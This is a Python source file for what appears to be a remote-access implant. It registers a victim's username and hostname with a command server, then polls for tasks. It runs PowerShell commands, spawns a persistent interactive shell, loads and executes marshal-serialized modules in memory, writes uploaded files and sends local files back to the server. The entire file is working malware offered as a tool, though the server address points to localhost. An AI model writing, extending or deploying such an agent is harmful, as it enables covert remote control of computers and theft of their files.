import requests
import socket
import getpass
import platform
import threading
import subprocess
import types
import marshal
import time
import tempfile
import sys
import io
import os
import zipfile
from multiprocessing import Process, Pipe, set_start_method, freeze_support



BASE_URL = "http://127.0.0.1"
HEARTBEAT = 5

class Request:
    def __init__(self):
        self.method = None
        self.headers = {}
        self.params = {}
        self.data = b""
        self.header_separator = b":|::|:" 
        self.header = b""
        self.task_id = b""
        self.url = b""
    
    def set_response(self, req):
        self.data = req.content

    def set_url(self, url):
        self.url = url

    def set_method(self, method):
        self.method = method.upper()

    def add_header(self, key, value):
        self.headers[key] = value
        
    def add_param(self, key, value):
        self.params[key] = value

    def set_task_id(self, task_id):
        self.task_id = task_id if isinstance(task_id, bytes) else task_id.encode()

    def set_data(self, data):
        self.data = data if isinstance(data, bytes) else data.encode()

    def set_header_separator(self, separator):
        self.header_separator = separator if isinstance(separator, bytes) else separator.encode()

    def set_header(self, header):
        self.header = header if isinstance(header, bytes) else header.encode()

    def get_header_separator(self):
        return self.header_separator

    def send(self):
        if not self.method or not self.url:
            raise ValueError("Method and URL must be set before sending the request")

        parts = [b"", b"", b""]

        if self.header:
            parts[0] = self.header
        if self.task_id:
            parts[1] = self.task_id
        if self.data:
            parts[2] = self.data

        payload = self.header_separator.join(parts)
        
        if self.method == 'GET':
            response = requests.get(self.url, headers=self.headers, params=self.params)
        elif self.method == 'POST':
            response = requests.post(self.url, headers=self.headers, data=payload)
        else:
            raise ValueError("Unsupported method. Use 'GET' or 'POST'")

        return response

    def recv(self, binary=False):
        
        if isinstance(self.data, str):
            raw_data = self.data
        else:
            raw_data = self.data

        header = b""
        task_id = b""
        data = b""

        parts = raw_data.split(self.header_separator, 2)
        
        if len(parts) == 3:
            header, task_id, data = parts
        elif len(parts) == 2:
            task_id, data = parts
        else:
            data = parts[0]

        self.header = header if binary else header.decode(errors="ignore")
        self.task_id = task_id if binary else task_id.decode(errors="ignore")
        self.data = data if binary else data.decode(errors="ignore")

        return True

def request(
    method,
    url,
    task_id=None, 
    data=None, 
    header=None, 
    header_separator=None, 
    headers=None,
    params=None,
):
    try:
        r = Request()
        if method:
            r.set_method(method)
        if url:
            r.set_url(url)
        if task_id:
            r.set_task_id(task_id)
        if header_separator:
            r.set_header_separator(header_separator)
        if header:
            r.set_header(header)
        if data:
            r.set_data(data)
        if headers:
            for key, value in headers.items():
                r.add_header(key, value)
        if params:
            for key, value in params.items():
                r.add_param(key, value)
        return r.send()
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return False


def parse_response(response, binary=False):
    try:
        r = Request()
        r.set_response(response)
        r.recv(binary)
        return r.header, r.task_id, r.data
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return None, None, None
    
def auth():
    info = get_system_info()
    response = request("POST", f"{BASE_URL}/auth", data=info)
    _, _, agent_id =  parse_response(response)
    return agent_id
    
def get_command(agent_id):
    response = request("GET", f"{BASE_URL}/task",params={"X-Agent-Id": agent_id})
    return parse_response(response,True)
    
def send_result(agent_id, task_id, result, header):
    response = request("POST", f"{BASE_URL}/result", headers={"X-Agent-Id": agent_id}, task_id=task_id, data=result, header=header)
    
    _, _, data =  parse_response(response)

    if data == "Done":
        return True
    return False
    

class PersistentShell:
    def __init__(self):
        self.process = subprocess.Popen(
            ['powershell.exe'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        self.output = ""
        self.lock = threading.Lock()
        self.marker = "__END__MARKER__"
        self.command_done = threading.Event()
        self._start_reader()
        self.closed = False

    def _start_reader(self):
        def read_output():
            buffer = ""
            for line in self.process.stdout:
                if line.startswith("PS "):
                    continue
                buffer += line
                if self.marker in line:
                    with self.lock:
                        self.output = buffer.replace(self.marker, '').strip()
                        buffer = ""
                    self.command_done.set()
        threading.Thread(target=read_output, daemon=True).start()

    def execute(self, cmd: str) -> str:
        if self.closed:
            return "Shell already closed"

        if cmd.strip().lower() == "exit":
            self.process.stdin.write("exit\n")
            self.process.stdin.flush()
            self.process.wait()
            self.closed = True
            return "Shell closed"

        with self.lock:
            self.output = ""
        self.command_done.clear()

        full_cmd = f"{cmd}; echo {self.marker}"
        try:
            self.process.stdin.write(full_cmd + "\n")
            self.process.stdin.flush()
        except Exception as e:
            return f"Failed to write command: {e}"

        self.command_done.wait()
        with self.lock:
            return self.output

def execute(cmd) -> str:
    try:
        result = subprocess.check_output(['powershell','-c',cmd],shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output
    return result.decode()

def get_system_info():
    username = getpass.getuser()        
    hostname = socket.gethostname()     
    os_type = platform.system().lower() 
    arch = platform.machine().lower()   

    if arch in ['amd64', 'x86_64']:
        arch = 'x64'
    elif 'arm' in arch:
        arch = 'arm'

    sep = Request().get_header_separator().decode()
    return f"{username}{sep}{hostname}{sep}{os_type}-{arch}"

def shell(agent_id):
    shell = PersistentShell()
    
    while True:
        response = None
        cmd = None
        
        while not cmd:
            header, task_id, cmd = get_command(agent_id)
        
        response = "\n" + shell.execute(cmd) + "\n\n"
        if cmd == "exit":
            send_result(agent_id, task_id, response)
            break
        if not response.strip("\n\n"):
            continue
        send_result(agent_id, task_id, response)
        
    return ""

def unzip_library(zip_path, extract_to):
    os.makedirs(extract_to, exist_ok=True)
    with zipfile.ZipFile(io.BytesIO(zip_path), 'r') as zipf:
        zipf.extractall(extract_to)

    if os.path.isdir(zip_path):
        os.remove(zip_path)

def run_module(lib, module, temp_dir, conn):

        unzip_library(lib, f"{temp_dir}/lib")
        
        code_obj = marshal.loads(module)
        mod_name = 'badmod'
        mod = types.ModuleType(mod_name)
        
        sys.path.insert(0, f"{temp_dir}/lib")
        exec(code_obj, mod.__dict__)
        if hasattr(mod, 'main'):
            result = mod.main()
            conn.send(result)
            
        else:
            conn.send(("", f"No entry-point 'main' in module {mod_name}"))
        conn.close()
            
def execute_module(data):
    parts = data.split(b"::::")
    lib = parts[0]
    module = parts[1]

    with tempfile.TemporaryDirectory() as temp_dir:
        
        parent_conn, child_conn = Pipe()
        p = Process(target=run_module, args=(lib, module, temp_dir, child_conn))
        p.start()
        if parent_conn.poll(10):
            result = parent_conn.recv()
        else:
            result = ("", "Timeout waiting for module result")
        p.join(timeout=10)
        if p.is_alive():
            p.terminate()
            p.join()
            
        return result

def upload(data):
    parts = data.split(b"::::")
    name = parts[0].decode()
    data = parts[1]
    
    with open(name, "wb") as f:
        f.write(data)

    file_path = f"{os.getcwd()}\\{name}"
        
    return b"UPLOAD_FILE_OK", f"File saved at {file_path}".encode()

def download(data):
    parts = data.split(b"::::")
    file_path = parts[1]

    if not os.path.isfile(file_path.decode()):
        return b"DOWNLOAD_FILE_NOTFOUND", file_path
    
    with open(file_path, "rb") as f:
        data = f.read()
        
    return b"DOWNLOAD_FILE_OK", data

def main():

    agent_id = auth()
    
    while True:
        response = None
        time.sleep(HEARTBEAT)
        header, task_id, cmd = get_command(agent_id)
        
        if header:
            match header.decode():
                case "CMD":
                    response = execute(cmd.decode())
                case "SHELL":
                    send_result(agent_id, task_id.decode(), "Spawned")
                    response = shell(agent_id)
                case "MODULE":
                    header, response = execute_module(cmd)
                case "UPLOAD":
                    header, response = upload(cmd)
                case "DOWNLOAD":
                    header, response = download(cmd)
                case _:
                    pass
        else:
            continue

        if not response:
            response = "\n"
    
        send_result(agent_id, task_id.decode(), response, header)       
        
if __name__ == "__main__":
    freeze_support()
    set_start_method("spawn")
    main()